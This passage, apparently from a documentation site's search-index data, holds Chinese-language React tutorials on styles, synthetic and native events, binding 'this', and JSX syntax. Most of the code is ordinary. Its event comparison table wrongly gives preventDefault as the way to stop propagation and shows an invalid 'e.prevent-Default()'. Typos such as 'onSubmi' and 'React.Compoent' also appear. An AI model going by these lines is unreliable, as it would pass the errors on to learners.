React样式技巧 样式中的像素值",content:"# React样式\n\nReact 组件最终会生成 HTML，所以你可以使用给普通 HTML 设置 CSS 一样的方法来设置 样式。如果我们想给组件添加类名，为了避免命名冲突，React 中需要设置 className prop。此外， 也可以通过 style prop 来给组件设置行内样式，这里要注意 style prop 需要的是一个对象。\n\n# className prop\n<Component className=\"btn\" />\n\n\n# style prop\nconst style = {\n    color: 'white',\n    backgroundImage: `url(${imgUrl})`,\n    transition: 'all'\n};\nconst component = <Component style={style} />;\n\n\n\n# React使用样式两种方式\n\n * className prop\n * style prop\n\n\n# 绑定样式到style属性\n\nclass RectBox extends React.Component {\n   render() {\n  \tvar RectBoxStyle = {\n    \twidth:100,\n        height:100,\n        backgroundColor:\"#4B8BF4\"\n    }\n    return (\n      <div style={RectBoxStyle}></div>\n    )\n  }\n}\nReactDOM.render(<RectBox />, document.querySelector(\"#app\"))\n\n\n\n# 类名方式添加样式\n\n//index.css\n.box{\n    color:#009494;\n    border:1px solid #fa0;\n    text-align:center;\n    line-height:30px;\n}\n//绑定该类名\nReactDOM.render(<div className='box'>风萧萧雨兮兮 </div>,document.body);\n\n\n\n# React样式技巧\n\n\n# 样式中的像素值\n\n当设置 width 和 height 这类与大小有关的样式时，大部分会以像素为单位，此时若重复输入 px，会很麻烦。为了提高效率，React 会自动对这样的属性添加 px。比如:\n\n// 渲染成 height: 10px\nconst style = { height: 10 };\nReactDOM.render(<Component style={style}>Hello</Component>, mountNode);\n\n\n> 注意，有些属性除了支持 px 为单位的像素值，还支持数字直接作为值，此时 React 并不添 加 px，如 lineHeight",normalizedContent:"# react样式\n\nreact 组件最终会生成 html，所以你可以使用给普通 html 设置 css 一样的方法来设置 样式。如果我们想给组件添加类名，为了避免命名冲突，react 中需要设置 classname prop。此外， 也可以通过 style prop 来给组件设置行内样式，这里要注意 style prop 需要的是一个对象。\n\n# classname prop\n<component classname=\"btn\" />\n\n\n# style prop\nconst style = {\n    color: 'white',\n    backgroundimage: `url(${imgurl})`,\n    transition: 'all'\n};\nconst component = <component style={style} />;\n\n\n\n# react使用样式两种方式\n\n * classname prop\n * style prop\n\n\n# 绑定样式到style属性\n\nclass rectbox extends react.component {\n   render() {\n  \tvar rectboxstyle = {\n    \twidth:100,\n        height:100,\n        backgroundcolor:\"#4b8bf4\"\n    }\n    return (\n      <div style={rectboxstyle}></div>\n    )\n  }\n}\nreactdom.render(<rectbox />, document.queryselector(\"#app\"))\n\n\n\n# 类名方式添加样式\n\n//index.css\n.box{\n    color:#009494;\n    border:1px solid #fa0;\n    text-align:center;\n    line-height:30px;\n}\n//绑定该类名\nreactdom.render(<div classname='box'>风萧萧雨兮兮 </div>,document.body);\n\n\n\n# react样式技巧\n\n\n# 样式中的像素值\n\n当设置 width 和 height 这类与大小有关的样式时，大部分会以像素为单位，此时若重复输入 px，会很麻烦。为了提高效率，react 会自动对这样的属性添加 px。比如:\n\n// 渲染成 height: 10px\nconst style = { height: 10 };\nreactdom.render(<component style={style}>hello</component>, mountnode);\n\n\n> 注意，有些属性除了支持 px 为单位的像素值，还支持数字直接作为值，此时 react 并不添 加 px，如 lineheight",charsets:{cjk:!0}},{title:"React事件",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/07-React%E4%BA%8B%E4%BB%B6.html",relativePath:"React/React基础/07-React事件.md",key:"v-c4aef394",path:"/React/React%E5%9F%BA%E7%A1%80/07-React%E4%BA%8B%E4%BB%B6.html",headers:[{level:2,title:"React事件处理",slug:"react事件处理",normalizedTitle:"react事件处理",charIndex:43},{level:2,title:"React合成事件",slug:"react合成事件",normalizedTitle:"react合成事件",charIndex:204},{level:2,title:"React支持事件",slug:"react支持事件",normalizedTitle:"react支持事件",charIndex:497},{level:3,title:"鼠标事件",slug:"鼠标事件",normalizedTitle:"鼠标事件",charIndex:511},{level:3,title:"键盘事件",slug:"键盘事件",normalizedTitle:"键盘事件",charIndex:725},{level:3,title:"表单事件",slug:"表单事件",normalizedTitle:"表单事件",charIndex:764},{level:3,title:"焦点事件",slug:"焦点事件",normalizedTitle:"焦点事件",charIndex:799},{level:3,title:"触控事件",slug:"触控事件",normalizedTitle:"触控事件",charIndex:824},{level:3,title:"剪贴板事件",slug:"剪贴板事件",normalizedTitle:"剪贴板事件",charIndex:884},{level:2,title:"事件中的this指向",slug:"事件中的this指向",normalizedTitle:"事件中的this指向",charIndex:916},{level:3,title:"bind方法",slug:"bind方法",normalizedTitle:"bind方法",charIndex:1562},{level:3,title:"构造函数内声明",slug:"构造函数内声明",normalizedTitle:"构造函数内声明",charIndex:2200},{level:3,title:"箭头函数",slug:"箭头函数",normalizedTitle:"箭头函数",charIndex:2943},{level:2,title:"在React中使用原生事件",slug:"在react中使用原生事件",normalizedTitle:"在react中使用原生事件",charIndex:3575},{level:2,title:"对比React合成事件与Javascript原生事件",slug:"对比react合成事件与javascript原生事件",normalizedTitle:"对比react合成事件与javascript原生事件",charIndex:4086},{level:2,title:"示例：事件对象",slug:"示例-事件对象",normalizedTitle:"示例：事件对象",charIndex:4668}],headersStr:"React事件处理 React合成事件 React支持事件 鼠标事件 键盘事件 表单事件 焦点事件 触控事件 剪贴板事件 事件中的this指向 bind方法 构造函数内声明 箭头函数 在React中使用原生事件 对比React合成事件与Javascript原生事件 示例：事件对象",content:'# React事件\n\n> React通过将事件处理器绑定到组件上来处理事件。\n\n\n# React事件处理\n\nReact通过将事件处理器绑定到组件上来处理事件。在事件被触发的同时，更新组件的内部状态。组件内部状态的更新会触发组件重绘。\n\nReact处理事件本质上和原生Javascript事件一样、所有的事件都进行了重新封装，事件在命名上与原生Javascript规范一致，并且会在相同的场景下触发。\n\n\n# React合成事件\n\n * React中实现的事件有如下作用：\n   1. 事件委托\n      合成事件会以事件委托的方式绑定到组件最上层，并且在组件卸载的时候自动销毁绑定的事件。\n   2. 原生事件\n      在 componentDidMount 方法里面通过 addEventListener 绑定的事件就是浏览器原生事件。使用原生事件的时候在 componentWillUnmount 解除绑定 removeEventListener 。\n * 阻止事件流、阻止浏览器默认动作使用e.stopPropagation() 或 e.preventDefault()。\n\n\n# React支持事件\n\n\n# 鼠标事件\n\nonClick onContextMenu onDoubleClick\n\nonDrag onDragEnd onDragEnter onDragExitonDragLeave onDragOver onDragStart onDrop\n\nonMouseEnter onMouseLeave\n\nonMouseDown onMouseMove onMouseUp\n\nonMouseOver onMouseOut\n\n\n# 键盘事件\n\nonKeyDown onKeyPress onKeyUp\n\n\n# 表单事件\n\nonChange onInput onSubmi\n\n\n# 焦点事件\n\nonFocus onBlur\n\n\n# 触控事件\n\nonTouchCancel onTouchEnd onTouchMove onTouchStart\n\n\n# 剪贴板事件\n\nonCopy onCut onPaste\n\n\n# 事件中的this指向\n\n在React组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。而且React还对这种引用进行缓存，已达到CPU和内存的最优化。在使用ES6 class 或者纯函数时，这种自动绑定就不复存在了，我们需要手动实现this的绑定。\n\nclass Counter extends Component{\n    constructor(props){\n        super(props);\n        this.state = {\n            value:0\n        }\n    }\n    increment(){\n        //this == window  不是我们认为组件的实例\n        this.setState({\n            value:this.state.value+1\n        })\n    }\n    render(){\n        return (<div>\n            <button onClick={this.increment}>+</button>\n            <div className="text">{this.state.value}</div>\n            <button onClick={this.decrement}>-</button>\n        </div>)\n    }\n}\n\n\n\n# bind方法\n\n这个方法可以帮助我们绑定事件处理器内的this,并可以向事件处理器中传递参数，比如：\n\nclass Counter extends Component{\n    constructor(props){\n        super(props);\n        this.state = {\n            value:0\n        }\n    }\n    increment(){\n        this.setState({\n            value:this.state.value+1\n        })\n    }\n    decrement(){\n        this.setState({\n            value:this.state.value-1\n        })\n    }\n    render(){\n        return (<div>\n            <button onClick={this.increment.bind(this)}>+</button>\n            <div className="text">{this.state.value}</div>\n            <button onClick={this.decrement.bind(this)}>-</button>\n        </div>)\n    }\n}\n\n\n\n# 构造函数内声明\n\n在组件的构造函数内完成了this的绑定，这种绑定方式的好处在于仅需要进行一次绑定，而不需要每次调用事件监听函数时区执行绑定操作：\n\nclass Counter extends Component{\n    constructor(props){\n        super(props);\n        this.state = {\n            value:0\n        }\n        this.increment = this.increment.bind(this);\n        this.decrement = this.decrement.bind(this);\n    }\n    increment(){\n        this.setState({\n            value:this.state.value+1\n        })\n    }\n    decrement(){\n        this.setState({\n            value:this.state.value-1\n        })\n    }\n    render(){\n        return (<div>\n            <button onClick={this.increment}>+</button>\n            <div className="text">{this.state.value}</div>\n            <button onClick={this.decrement}>-</button>\n        </div>)\n    }\n}\n\n\n\n# 箭头函数\n\n箭头函数不仅是函数的语法糖，它还自动绑定了定义此函数作用域的this,因此我们不需要再对它使用bind方法。\n\nclass Counter extends Component{\n    constructor(props){\n        super(props);\n        this.state = {\n            value:0\n        }\n    }\n    increment=()=>{\n        this.setState({\n            value:this.state.value+1\n        })\n    }\n    decrement=()=>{\n        this.setState({\n            value:this.state.value-1\n        })\n    }\n    render(){\n        return (<div>\n            <button onClick={this.increment}>+</button>\n            <div className="text">{this.state.value}</div>\n            <button onClick={this.decrement}>-</button>\n        </div>)\n    }\n}\n\n\n\n# 在React中使用原生事件\n\nReact提供了很好的合成事件系统，但是这并不意味着在React架构下无法使用原生事件。React提供了完备的生命周期方法，其中componentDidMount会在组件已经完成安装并且在浏览器中存在真实的DOM后调用，此时我们就可以完成原生事件的绑定。\n\nclass Button extends React.Component{\n    componentDidMount(){\n        this.refs.btn.addEventListener(\'click\',this.handleClick);\n    }\n    componentWillUnmount(){\n        this.refs.btn.removeEventListener(\'click\',this.handleClick);\n    }\n    handleClick(){\n        alert(\'点击了按钮！\');\n    }\n    render(){\n        return (<button ref="btn">Button</button>)\n    }\n\n}\n\n\n\n# 对比React合成事件与Javascript原生事件\n\n类型       JAVASCRIPT原生事件                                          REACT合成事件\n阻止事件传播   e.preventDefault()                                      e.prevent-Default()\n事件类型     JavaScript原生事件                                          React合成事件的事件类型是JavaScript原生事件类型子集。\n事件绑定     1. 直接在DOM元素绑定<button onclick="alert(1)">Test</button>   <button onClick={this.handleClick}>Test</button>\n         2. 直接复制绑定elm.onclick=e=>{alert(1)}\n         3. 通过监听函数绑定elm.addEventListener(\'click\',fn)\n事件对象     原生事件对象(存在兼容问题)                                          合成事件对象(不存在兼容)\n\n\n# 示例：事件对象\n\nclass Color extends React.Component{\n  \tconstructor(){\n      super();\n      this.state ={\n        r : 144,\n        g : 144,\n        b : 144\n      }\n    }\n  \thandleChange(ev){\n      console.log(ev.clientX)\n      this.setState({\n        r : Math.floor(ev.clientX/1.5),\n        g : Math.floor(ev.clientY/1.5),\n        b : Math.abs(ev.clientX-ev.clientY)\n      })\n    }\n  \trender(){\n      return <div id="box" onMouseMove={this.handleChange.bind(this)} style={{backgroundColor:`rgb(${this.state.r},${this.state.g},${this.state.b})`}}>\n        R{this.state.r},G{this.state.g},B{this.state.b}\n      </div>\n    }\n}\nReactDOM.render(<Color/>,document.querySelector(\'#app\'))\n',normalizedContent:'# react事件\n\n> react通过将事件处理器绑定到组件上来处理事件。\n\n\n# react事件处理\n\nreact通过将事件处理器绑定到组件上来处理事件。在事件被触发的同时，更新组件的内部状态。组件内部状态的更新会触发组件重绘。\n\nreact处理事件本质上和原生javascript事件一样、所有的事件都进行了重新封装，事件在命名上与原生javascript规范一致，并且会在相同的场景下触发。\n\n\n# react合成事件\n\n * react中实现的事件有如下作用：\n   1. 事件委托\n      合成事件会以事件委托的方式绑定到组件最上层，并且在组件卸载的时候自动销毁绑定的事件。\n   2. 原生事件\n      在 componentdidmount 方法里面通过 addeventlistener 绑定的事件就是浏览器原生事件。使用原生事件的时候在 componentwillunmount 解除绑定 removeeventlistener 。\n * 阻止事件流、阻止浏览器默认动作使用e.stoppropagation() 或 e.preventdefault()。\n\n\n# react支持事件\n\n\n# 鼠标事件\n\nonclick oncontextmenu ondoubleclick\n\nondrag ondragend ondragenter ondragexitondragleave ondragover ondragstart ondrop\n\nonmouseenter onmouseleave\n\nonmousedown onmousemove onmouseup\n\nonmouseover onmouseout\n\n\n# 键盘事件\n\nonkeydown onkeypress onkeyup\n\n\n# 表单事件\n\nonchange oninput onsubmi\n\n\n# 焦点事件\n\nonfocus onblur\n\n\n# 触控事件\n\nontouchcancel ontouchend ontouchmove ontouchstart\n\n\n# 剪贴板事件\n\noncopy oncut onpaste\n\n\n# 事件中的this指向\n\n在react组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。而且react还对这种引用进行缓存，已达到cpu和内存的最优化。在使用es6 class 或者纯函数时，这种自动绑定就不复存在了，我们需要手动实现this的绑定。\n\nclass counter extends component{\n    constructor(props){\n        super(props);\n        this.state = {\n            value:0\n        }\n    }\n    increment(){\n        //this == window  不是我们认为组件的实例\n        this.setstate({\n            value:this.state.value+1\n        })\n    }\n    render(){\n        return (<div>\n            <button onclick={this.increment}>+</button>\n            <div classname="text">{this.state.value}</div>\n            <button onclick={this.decrement}>-</button>\n        </div>)\n    }\n}\n\n\n\n# bind方法\n\n这个方法可以帮助我们绑定事件处理器内的this,并可以向事件处理器中传递参数，比如：\n\nclass counter extends component{\n    constructor(props){\n        super(props);\n        this.state = {\n            value:0\n        }\n    }\n    increment(){\n        this.setstate({\n            value:this.state.value+1\n        })\n    }\n    decrement(){\n        this.setstate({\n            value:this.state.value-1\n        })\n    }\n    render(){\n        return (<div>\n            <button onclick={this.increment.bind(this)}>+</button>\n            <div classname="text">{this.state.value}</div>\n            <button onclick={this.decrement.bind(this)}>-</button>\n        </div>)\n    }\n}\n\n\n\n# 构造函数内声明\n\n在组件的构造函数内完成了this的绑定，这种绑定方式的好处在于仅需要进行一次绑定，而不需要每次调用事件监听函数时区执行绑定操作：\n\nclass counter extends component{\n    constructor(props){\n        super(props);\n        this.state = {\n            value:0\n        }\n        this.increment = this.increment.bind(this);\n        this.decrement = this.decrement.bind(this);\n    }\n    increment(){\n        this.setstate({\n            value:this.state.value+1\n        })\n    }\n    decrement(){\n        this.setstate({\n            value:this.state.value-1\n        })\n    }\n    render(){\n        return (<div>\n            <button onclick={this.increment}>+</button>\n            <div classname="text">{this.state.value}</div>\n            <button onclick={this.decrement}>-</button>\n        </div>)\n    }\n}\n\n\n\n# 箭头函数\n\n箭头函数不仅是函数的语法糖，它还自动绑定了定义此函数作用域的this,因此我们不需要再对它使用bind方法。\n\nclass counter extends component{\n    constructor(props){\n        super(props);\n        this.state = {\n            value:0\n        }\n    }\n    increment=()=>{\n        this.setstate({\n            value:this.state.value+1\n        })\n    }\n    decrement=()=>{\n        this.setstate({\n            value:this.state.value-1\n        })\n    }\n    render(){\n        return (<div>\n            <button onclick={this.increment}>+</button>\n            <div classname="text">{this.state.value}</div>\n            <button onclick={this.decrement}>-</button>\n        </div>)\n    }\n}\n\n\n\n# 在react中使用原生事件\n\nreact提供了很好的合成事件系统，但是这并不意味着在react架构下无法使用原生事件。react提供了完备的生命周期方法，其中componentdidmount会在组件已经完成安装并且在浏览器中存在真实的dom后调用，此时我们就可以完成原生事件的绑定。\n\nclass button extends react.component{\n    componentdidmount(){\n        this.refs.btn.addeventlistener(\'click\',this.handleclick);\n    }\n    componentwillunmount(){\n        this.refs.btn.removeeventlistener(\'click\',this.handleclick);\n    }\n    handleclick(){\n        alert(\'点击了按钮！\');\n    }\n    render(){\n        return (<button ref="btn">button</button>)\n    }\n\n}\n\n\n\n# 对比react合成事件与javascript原生事件\n\n类型       javascript原生事件                                          react合成事件\n阻止事件传播   e.preventdefault()                                      e.prevent-default()\n事件类型     javascript原生事件                                          react合成事件的事件类型是javascript原生事件类型子集。\n事件绑定     1. 直接在dom元素绑定<button onclick="alert(1)">test</button>   <button onclick={this.handleclick}>test</button>\n         2. 直接复制绑定elm.onclick=e=>{alert(1)}\n         3. 通过监听函数绑定elm.addeventlistener(\'click\',fn)\n事件对象     原生事件对象(存在兼容问题)                                          合成事件对象(不存在兼容)\n\n\n# 示例：事件对象\n\nclass color extends react.component{\n  \tconstructor(){\n      super();\n      this.state ={\n        r : 144,\n        g : 144,\n        b : 144\n      }\n    }\n  \thandlechange(ev){\n      console.log(ev.clientx)\n      this.setstate({\n        r : math.floor(ev.clientx/1.5),\n        g : math.floor(ev.clienty/1.5),\n        b : math.abs(ev.clientx-ev.clienty)\n      })\n    }\n  \trender(){\n      return <div id="box" onmousemove={this.handlechange.bind(this)} style={{backgroundcolor:`rgb(${this.state.r},${this.state.g},${this.state.b})`}}>\n        r{this.state.r},g{this.state.g},b{this.state.b}\n      </div>\n    }\n}\nreactdom.render(<color/>,document.queryselector(\'#app\'))\n',charsets:{cjk:!0}},{title:"ReactJSX",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/02-ReactJSX.html",relativePath:"React/React基础/02-ReactJSX.md",key:"v-4df5d9c0",path:"/React/React%E5%9F%BA%E7%A1%80/02-ReactJSX.html",headers:[{level:2,title:"JSX介绍",slug:"jsx介绍",normalizedTitle:"jsx介绍",charIndex:67},{level:3,title:"JSX由来",slug:"jsx由来",normalizedTitle:"jsx由来",charIndex:77},{level:3,title:"JSX是什么",slug:"jsx是什么",normalizedTitle:"jsx是什么",charIndex:193},{level:3,title:"为什么使用JSX",slug:"为什么使用jsx",normalizedTitle:"为什么使用jsx",charIndex:602},{level:2,title:"开始使用JSX",slug:"开始使用jsx",normalizedTitle:"开始使用jsx",charIndex:747},{level:3,title:"开始前准备",slug:"开始前准备",normalizedTitle:"开始前准备",charIndex:759},{level:3,title:"基本语法",slug:"基本语法",normalizedTitle:"基本语法",charIndex:1301},{level:3,title:"元素属性",slug:"元素属性",normalizedTitle:"元素属性",charIndex:1902},{level:2,title:"注释",slug:"注释",normalizedTitle:"注释",charIndex:2143},{level:3,title:"作为子节点",slug:"作为子节点",normalizedTitle:"作为子节点",charIndex:2229},{level:3,title:"作为内联属性",slug:"作为内联属性",normalizedTitle:"作为内联属性",charIndex:2389},{level:2,title:"JSX 表达式",slug:"jsx-表达式",normalizedTitle:"jsx 表达式",charIndex:2515},{level:3,title:"使用变量或属性",slug:"使用变量或属性",normalizedTitle:"使用变量或属性",charIndex:2600},{level:3,title:"数组",slug:"数组",normalizedTitle:"数组",charIndex:2736},{level:3,title:"调用函数/方法",slug:"调用函数-方法",normalizedTitle:"调用函数/方法",charIndex:3134},{level:3,title:"使用条件判断",slug:"使用条件判断",normalizedTitle:"使用条件判断",charIndex:3614}],headersStr:"JSX介绍 JSX由来 JSX是什么 为什么使用JSX 开始使用JSX 开始前准备 基本语法 元素属性 注释 作为子节点 作为内联属性 JSX 表达式 使用变量或属性 数组 调用函数/方法 使用条件判断",content:'# ReactJSX\n\n> JSX允许我们在JavaScript代码中写HTML，而不是用HTML包含JavaScript。\n\n\n# JSX介绍\n\n\n# JSX由来\n\nReact是通过JavaScript生成用户界面。如果通过JavaScript语法写HTML代码，那将是一个灾难。JSX出现就是为了让我们可以在JavaScript代码中书写HTML语法来提高我们的开发效率。\n\n\n# JSX是什么\n\n> JSX = JavaScript XML是一种在React组件内部构建标签的类XML语法。\n\n在不使用JSX，情况下我们需要通过React.createElement方法来创建React元素。\n\nReact.createElement(\'h3\',{className:\'title\'},\'你好，!\')\n\n\n如果使用了JSX,上述的函数调用就变为了非常熟悉的声明式的HTML标签方式：\n\n<h3 className=\'title\'>你好，！</h3>\n\n\nReact中JSX基本原理就是把JSX中出现的html标签自动转换成React.createElement()，这样就转换成了js代码。我们也可以通过React.createElement()去创建组件，这样可以不必使用JSX，但是这样相对复杂。\n\nJSX赋予了React强大的表现力，使得我们在开发中利用JSX可大大的提高开发效率。\n\n\n# 为什么使用JSX\n\n使用JSX有着非常多的好处，而这些好处会随着项目的日益增大、组件的愈加复杂而别的越来越明显。\n\n * 提高开发效率\n * 更加熟悉\n * 更加语义化\n * 结构清晰直观,可以提高组件的可读性\n * 抽象化: 抽象了将html标签转换为javascript的过程\n\n\n# 开始使用JSX\n\n\n# 开始前准备\n\n在浏览器中使用JSX，需下载babel.js库\n<script src="babel.min.js"><\/script>\n\n              JSX type="text/babel"\n              ----------------\n<script type="text/babel">\n          组件名 自定义组件名首字母必须大写\n          -----\n    class Hello extends React.Component{       子节点\n        render(){                       ----------------------\n            return <div className="box">hello,{this.props.name}</div>\n        }\n    }\n                       节点属性\n                       -------------\nReactDOM.render(<Hello name="allcky"/>,document.body); <\/script>\n\n\n\n# 基本语法\n\n使用XML语法的好处是标签可以嵌套。我们可以像HTML一样清晰的看到DOM的结构以及属性。比如我们有如下组件：\n\nclass List extends React.Compoent{\n    render(){\n        return (<ul>\n                <li>list1</li>\n                <li>list2</li>\n                <li>list3</li>\n            </ul>)\n    }\n}\n\n\n使用了JSX之后就如同在写HTML一样，大大提高了开发效率。但是需要注意如下几点：\n\n 1. 元素名(组件)首字母大写 (区分自定义元素名<大写>与html标签<小写>)\n 2. 符合HTML嵌套规则\n 3. 可以写入求值表达式 {this.props.name}\n 4. 可以采用驼峰命名\n 5. 不能使用javascript原生函数的一些关键词，如for和class 需要替换成htmlFor和className\n 6. 返回标签必须包含在一个标签中。例如：<span>名称：</span><div></div>返回这样结果会报错。\n 7. 标签必须要闭合。所有的标签无论是单标签、双标签都必须要闭合，不闭合会报错。例如：<img src="" /> <span></span>\n\n\n# 元素属性\n\n> 元素除了标签外，另一个组成部分就是属性。\n\n在JSX中，无论DOM元素还是组件元素，他们都有属性。不同的是DOM元素的属性是标准规范的属性。但是有两个属性例外————class和for，这是因为在JavaScript中这两个单词都是关键字。 因此我们在使用的时候需要进行转换：\n\n * class属性改为className\n * for属性改为 htmlFor\n\n组件的属性都是自定义属性，主要的作用是给组件内部传递数据以及参数，在后面参数章节会详细介绍。\n\n\n# 注释\n\nJSX本质上就是Javascript，因此你可以在标签内添加原生注释。注释可以用以下两种形式添加：\n\n * 当做一个元素的子节点\n * 内联在元素的属性中\n\n\n# 作为子节点\n\n子节点形式的注释只需要简单的包裹在花括号内即可，并且可以跨越多行。\n\n<div>\n    {/* 这是一个 input 元素，\n    主要是用来收集用户的邮箱信息*/}\n    <input name="email" placeholder="Email Address" />\n</div>\n\n\n\n# 作为内联属性\n\n可以使用单行注释：\n\n<div>\n    <input\n        name="email" // 关于 email input\n        placeholder="Email Address" />\n</div>\n\n\n\n# JSX 表达式\n\n> 在 JSX 当中的表达式要包含在大括号里。\n\nJSX将两个大括号之间的内容{...}渲染为动态值，大括号里面可以是一个变量，也可以是函数。\n\n\n# 使用变量或属性\n\nclass Hello extends React.Component{\n    render(){\n        var name = "allcky";\n        return <div>{name}</div>;\n    }\n}\n\n\n\n# 数组\n\nJSX 允许在模板中插入数组，数组会自动展开所有成员\n\n# 示例1：自动展开数组成员\nvar arr = [\n  <h1>前端培训</h1>,\n];\nReactDOM.render(\n  <div>{arr}</div>,\n  document.getElementById(\'example\')\n);\n\n# 示例2：访问数组某个值\nclass Test extends React.Component{\n    render(){\n        var data = [\'张三\',\'李四\',\'王武\'];\n        return <ul>\n            <li>{data[0]}</li>\n            <li>{data[1]}</li>\n            <li>{data[2]}</li>\n        </ul>\n    }\n}\n\n\n\n# 调用函数/方法\n\n# 示例1：\nclass MyDate extends React.Component{\n    render(){\n        function restDate(d){\n            return [\n                d.getFullYear(),\n                d.getMonth()+1,\n                d.getDate()\n                ].join("-");\n        }\n        return <div>{restDate(new Date())}</div>\n    }\n}\n\n# 示例2：调用对象方法\nclass ReverseText extends React.Component{\n    render(){\n        var str = "hello";\n        return <div>{str.split(\'\').reverse().join(\'\')}</div>\n    }\n}\n\n\n\n# 使用条件判断\n\n# 三元运算符\n\n\nclass Hello extends React.Component{\n    render(){\n        return <div>Hello,{this.props.name?this.props.name:"houningzhou"}</div>\n    }\n}\nReactDOM.render(<Hello name=\'allcky\'/>,document.body);\n<\/script>\n\n\n# if else\n\n\nclass Hello extends React.Component{\n    render(){\n        var getName =  () =>{\n            if(this.props.name){\n                return this.props.name;\n            }else{\n                return "houningzhou";\n            }\n        }\n        return <div>Hello,{getName()}</div>\n    }\n}\n\nReactDOM.render(<Hello name=\'allcky\'/>,document.querySelector("#app"));\n<\/script>\n\n\n# 逻辑运算符 ||\n\n\n<script async src="//jsrun.pro/YAhKp/embed/js,html,result/light/">\nclass Hello extends React.Component{\n    render(){\n        return <div>Hello,{this.props.name||"houningzhou"}</div>\n    }\n}\nReactDOM.render(<Hello name=\'allcky\'/>,document.querySelector("#app"));\n<\/script>\n',normalizedContent:'# reactjsx\n\n> jsx允许我们在javascript代码中写html，而不是用html包含javascript。\n\n\n# jsx介绍\n\n\n# jsx由来\n\nreact是通过javascript生成用户界面。如果通过javascript语法写html代码，那将是一个灾难。jsx出现就是为了让我们可以在javascript代码中书写html语法来提高我们的开发效率。\n\n\n# jsx是什么\n\n> jsx = javascript xml是一种在react组件内部构建标签的类xml语法。\n\n在不使用jsx，情况下我们需要通过react.createelement方法来创建react元素。\n\nreact.createelement(\'h3\',{classname:\'title\'},\'你好，!\')\n\n\n如果使用了jsx,上述的函数调用就变为了非常熟悉的声明式的html标签方式：\n\n<h3 classname=\'title\'>你好，！</h3>\n\n\nreact中jsx基本原理就是把jsx中出现的html标签自动转换成react.createelement()，这样就转换成了js代码。我们也可以通过react.createelement()去创建组件，这样可以不必使用jsx，但是这样相对复杂。\n\njsx赋予了react强大的表现力，使得我们在开发中利用jsx可大大的提高开发效率。\n\n\n# 为什么使用jsx\n\n使用jsx有着非常多的好处，而这些好处会随着项目的日益增大、组件的愈加复杂而别的越来越明显。\n\n * 提高开发效率\n * 更加熟悉\n * 更加语义化\n * 结构清晰直观,可以提高组件的可读性\n * 抽象化: 抽象了将html标签转换为javascript的过程\n\n\n# 开始使用jsx\n\n\n# 开始前准备\n\n在浏览器中使用jsx，需下载babel.js库\n<script src="babel.min.js"><\/script>\n\n              jsx type="text/babel"\n              ----------------\n<script type="text/babel">\n          组件名 自定义组件名首字母必须大写\n          -----\n    class hello extends react.component{       子节点\n        render(){                       ----------------------\n            return <div classname="box">hello,{this.props.name}</div>\n        }\n    }\n                       节点属性\n                       -------------\nreactdom.render(<hello name="allcky"/>,document.body); <\/script>\n\n\n\n# 基本语法\n\n使用xml语法的好处是标签可以嵌套。我们可以像html一样清晰的看到dom的结构以及属性。比如我们有如下组件：\n\nclass list extends react.compoent{\n    render(){\n        return (<ul>\n                <li>list1</li>\n                <li>list2</li>\n                <li>list3</li>\n            </ul>)\n    }\n}\n\n\n使用了jsx之后就如同在写html一样，大大提高了开发效率。但是需要注意如下几点：\n\n 1. 元素名(组件)首字母大写 (区分自定义元素名<大写>与html标签<小写>)\n 2. 符合html嵌套规则\n 3. 可以写入求值表达式 {this.props.name}\n 4. 可以采用驼峰命名\n 5. 不能使用javascript原生函数的一些关键词，如for和class 需要替换成htmlfor和classname\n 6. 返回标签必须包含在一个标签中。例如：<span>名称：</span><div></div>返回这样结果会报错。\n 7. 标签必须要闭合。所有的标签无论是单标签、双标签都必须要闭合，不闭合会报错。例如：<img src="" /> <span></span>\n\n\n# 元素属性\n\n> 元素除了标签外，另一个组成部分就是属性。\n\n在jsx中，无论dom元素还是组件元素，他们都有属性。不同的是dom元素的属性是标准规范的属性。但是有两个属性例外————class和for，这是因为在javascript中这两个单词都是关键字。 因此我们在使用的时候需要进行转换：\n\n * class属性改为classname\n * for属性改为 htmlfor\n\n组件的属性都是自定义属性，主要的作用是给组件内部传递数据以及参数，在后面参数章节会详细介绍。\n\n\n# 注释\n\njsx本质上就是javascript，因此你可以在标签内添加原生注释。注释可以用以下两种形式添加：\n\n * 当做一个元素的子节点\n * 内联在元素的属性中\n\n\n# 作为子节点\n\n子节点形式的注释只需要简单的包裹在花括号内即可，并且可以跨越多行。\n\n<div>\n    {/* 这是一个 input 元素，\n    主要是用来收集用户的邮箱信息*/}\n    <input name="email" placeholder="email address" />\n</div>\n\n\n\n# 作为内联属性\n\n可以使用单行注释：\n\n<div>\n    <input\n        name="email" // 关于 email input\n        placeholder="email address" />\n</div>\n\n\n\n# jsx 表达式\n\n> 在 jsx 当中的表达式要包含在大括号里。\n\njsx将两个大括号之间的内容{...}渲染为动态值，大括号里面可以是一个变量，也可以是函数。\n\n\n# 使用变量或属性\n\nclass hello extends react.component{\n    render(){\n        var name = "allcky";\n        return <div>{name}</div>;\n    }\n}\n\n\n\n# 数组\n\njsx 允许在模板中插入数组，数组会自动展开所有成员\n\n# 示例1：自动展开数组成员\nvar arr = [\n  <h1>前端培训</h1>,\n];\nreactdom.render(\n  <div>{arr}</div>,\n  document.getelementbyid(\'example\')\n);\n\n# 示例2：访问数组某个值\nclass test extends react.component{\n    render(){\n        var data = [\'张三\',\'李四\',\'王武\'];\n        return <ul>\n            <li>{data[0]}</li>\n            <li>{data[1]}</li>\n            <li>{data[2]}</li>\n        </ul>\n    }\n}\n\n\n\n# 调用函数/方法\n\n# 示例1：\nclass mydate extends react.component{\n    render(){\n        function restdate(d){\n            return [\n                d.getfullyear(),\n                d.getmonth()+1,\n                d.getdate()\n                ].join("-");\n        }\n        return <div>{restdate(new date())}</div>\n    }\n}\n\n# 示例2：调用对象方法\nclass reversetext extends react.component{\n    render(){\n        var str = "hello";\n        return <div>{str.split(\'\').reverse().join(\'\')}</div>\n    }\n}\n\n\n\n# 使用条件判断\n\n# 三元运算符\n\n\nclass hello extends react.component{\n    render(){\n        return <div>hello,{this.props.name?this.props.name:"houningzhou"}</div>\n    }\n}\nreactdom.render(<hello name=\'allcky\'/>,document.body);\n<\/script>\n\n\n# if else\n\n\nclass hello extends react.component{\n    render(){\n        var getname =  () =>{\n            if(this.props.name){\n                return this.props.name;\n            }else{\n                return "houningzhou";\n            }\n        }\n        return <div>hello,{getname()}</div>\n    }\n}\n\nreactdom.render(<hello 